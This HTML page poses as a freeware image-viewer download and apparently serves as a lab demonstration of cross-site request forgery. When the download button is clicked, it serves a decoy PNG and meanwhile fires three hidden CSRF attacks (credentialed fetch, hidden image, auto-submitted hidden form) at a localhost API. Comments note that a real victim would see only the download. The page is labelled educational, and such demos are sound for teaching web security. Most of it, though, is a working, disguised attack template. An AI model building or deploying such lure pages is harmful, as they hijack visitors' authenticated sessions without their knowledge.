<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Software Download</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            border: 1px solid #e9ecef;
        }
        
        h1 {
            color: #2c3e50;
            font-size: 1.8em;
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .software-icon {
            width: 80px;
            height: 80px;
            background: #007bff;
            border-radius: 12px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2em;
            font-weight: bold;
        }
        
        .software-info {
            color: #495057;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 1em;
        }
        
        .download-btn {
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1.1em;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 600;
            text-decoration: none;
            display: inline-block;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
        }
        
        .download-btn:active {
            transform: translateY(0);
        }
        
        .download-icon {
            margin-right: 8px;
            font-size: 1.2em;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 6px;
            padding: 15px;
            margin: 25px 0;
            color: #856404;
            font-size: 0.9em;
        }
        
        .attack-log {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 6px;
            padding: 15px;
            margin-top: 25px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            max-height: 250px;
            overflow-y: auto;
        }
        
        .success {
            color: #28a745;
            font-weight: 500;
        }
        
        .error {
            color: #dc3545;
            font-weight: 500;
        }
        
        .info {
            color: #17a2b8;
            font-weight: 500;
        }
        
        .file-info {
            background: #e9ecef;
            border-radius: 6px;
            padding: 15px;
            margin: 20px 0;
            font-size: 0.9em;
        }
        
        .file-info strong {
            color: #495057;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="software-icon">üì¶</div>
        <h1>Free Image Viewer Pro</h1>
        
        <div class="software-info">
            <p>Download our lightweight and fast image viewer software. Perfect for viewing PNG, JPG, and GIF files with advanced features.</p>
        </div>
        
        <div class="file-info">
            <strong>File:</strong> ImageViewerPro.zip<br>
            <strong>Size:</strong> 2.3 MB<br>
            <strong>Version:</strong> 3.1.4<br>
            <strong>License:</strong> Freeware
        </div>
        
        <div class="warning">
            ‚ö†Ô∏è <strong>Security Demo:</strong> This demonstrates CSRF attack vectors for educational purposes
        </div>
        
        <button class="download-btn" onclick="downloadSoftware()">
            <span class="download-icon">‚¨áÔ∏è</span>
            Download Free Software
        </button>
        
        <div id="attackLog" class="attack-log" style="display: none;">
            <h4>üîç Security Analysis Log:</h4>
            <div id="logContent"></div>
        </div>
        
        <!-- Hidden iframe for silent CSRF attacks -->
        <iframe name="csrf-frame" style="display: none;"></iframe>
    </div>

    <script>
        let logVisible = false;
        
        /**
         * Logs security demo messages with timestamps
         * @param {string} message - The message to log
         * @param {string} type - The type of message (info, success, error)
         */
        function log(message, type = 'info') {
            const logDiv = document.getElementById('attackLog');
            const contentDiv = document.getElementById('logContent');
            
            if (!logVisible) {
                logDiv.style.display = 'block';
                logVisible = true;
            }
            
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = type;
            logEntry.innerHTML = `[${timestamp}] ${message}`;
            contentDiv.appendChild(logEntry);
            contentDiv.scrollTop = contentDiv.scrollHeight;
        }
        
        /**
         * Creates and downloads a sample PNG file
         * This provides legitimate functionality to mask the CSRF attack
         */
        function downloadSamplePNG() {
            // Create a simple 1x1 transparent PNG (smallest valid PNG)
            const pngData = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
            
            const link = document.createElement('a');
            link.href = pngData;
            link.download = 'ImageViewerPro_Sample.png';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            log("‚úÖ Sample file downloaded successfully", 'success');
        }
        
        /**
         * CSRF METHOD 1: JavaScript Fetch Attack
         * Uses fetch() API to make cross-origin requests to the target endpoint
         * This works because the target API has CORS enabled with wildcard (*)
         */
        async function performFetchCSRF() {
            log("üöÄ Method 1: Starting JavaScript Fetch CSRF attack...", 'info');
            
            try {
                const response = await fetch('http://localhost:3000/api/test', {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'include', // Include cookies if any
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest', // Common AJAX header
                        'User-Agent': 'CSRF-Attack-Demo'
                    }
                });
                
                const data = await response.json();
                log(`üì° Fetch CSRF SUCCESS: ${data.message}`, 'success');
                log(`üìä Server response: ${data.csrf_demo}`, 'info');
                
                return true;
            } catch (error) {
                log(`‚ùå Fetch CSRF FAILED: ${error.message}`, 'error');
                return false;
            }
        }
        
        /**
         * CSRF METHOD 2: Image Tag Attack
         * Creates a hidden <img> tag pointing to the target endpoint
         * This works even if the endpoint returns non-image content
         * The browser will still make the GET request
         */
        function performImageCSRF() {
            log(" Method 2: Starting Image Tag CSRF attack...", 'info');
            
            const csrfImg = document.createElement('img');
            csrfImg.style.display = 'none';
            csrfImg.style.position = 'absolute';
            csrfImg.style.left = '-9999px';
            
            // Add timestamp to avoid caching
            csrfImg.src = `http://localhost:3000/api/test?timestamp=${Date.now()}`;
            
            // Handle both success and error cases
            csrfImg.onload = function() {
                log("üì∑ Image CSRF SUCCESS: Request completed", 'success');
            };
            
            csrfImg.onerror = function() {
                log("üì∑ Image CSRF COMPLETED: Request sent (error expected for non-image response)", 'info');
            };
            
            // Add to DOM to trigger the request
            document.body.appendChild(csrfImg);
            
            // Clean up after 5 seconds
            setTimeout(() => {
                if (document.body.contains(csrfImg)) {
                    document.body.removeChild(csrfImg);
                }
            }, 5000);
        }
        
        /**
         * CSRF METHOD 3: Form Submission Attack
         * Creates and auto-submits a hidden form to the target endpoint
         * Uses a hidden iframe to avoid page navigation
         */
        function performFormCSRF() {
            log(" Method 3: Starting Form Submission CSRF attack...", 'info');
            
            // Create hidden form
            const form = document.createElement('form');
            form.action = 'http://localhost:3000/api/test';
            form.method = 'GET'; // Using GET for this demo, POST would be more dangerous
            form.target = 'csrf-frame'; // Submit to hidden iframe
            form.style.display = 'none';
            
            // Add form data that would be sent
            const attackData = [
                { name: 'method', value: 'form_submission' },
                { name: 'victim_id', value: 'user123' },
                { name: 'action', value: 'csrf_test' },
                { name: 'timestamp', value: Date.now().toString() }
            ];
            
            attackData.forEach(item => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = item.name;
                input.value = item.value;
                form.appendChild(input);
            });
            
            // Monitor iframe for response
            const iframe = document.querySelector('iframe[name="csrf-frame"]');
            iframe.onload = function() {
                log("üìã Form CSRF SUCCESS: Form submitted and response received", 'success');
            };
            
            // Add form to DOM and submit
            document.body.appendChild(form);
            
            setTimeout(() => {
                form.submit();
                log("üì§ Form CSRF: Form submitted to target endpoint", 'info');
                
                // Clean up
                setTimeout(() => {
                    if (document.body.contains(form)) {
                        document.body.removeChild(form);
                    }
                }, 3000);
            }, 1000);
        }
        
        /**
         * Main function triggered by download button
         * Performs legitimate download AND executes CSRF attacks
         */
        async function downloadSoftware() {
            log("üéØ Download initiated - Starting security demonstration...", 'info');
            
            // First, provide the legitimate functionality
            downloadSamplePNG();
            
            // Then execute all CSRF attack methods
            log(" Executing multiple CSRF attack vectors...", 'info');
            
            // Method 1: Fetch API attack (immediate)
            await performFetchCSRF();
            
            // Method 2: Image tag attack (delayed)
            setTimeout(() => {
                performImageCSRF();
            }, 1000);
            
            // Method 3: Form submission attack (more delayed)
            setTimeout(() => {
                performFormCSRF();
            }, 2000);
            
            // Final summary
            setTimeout(() => {
                log(" In a real attack, the user would only see the download, not these logs.", 'info');
            }, 4000);
        }


        
        
        // Initialize
        log(" Malicious page loaded. Click download to trigger CSRF attacks.", 'info');



    </script>
</body>
</html>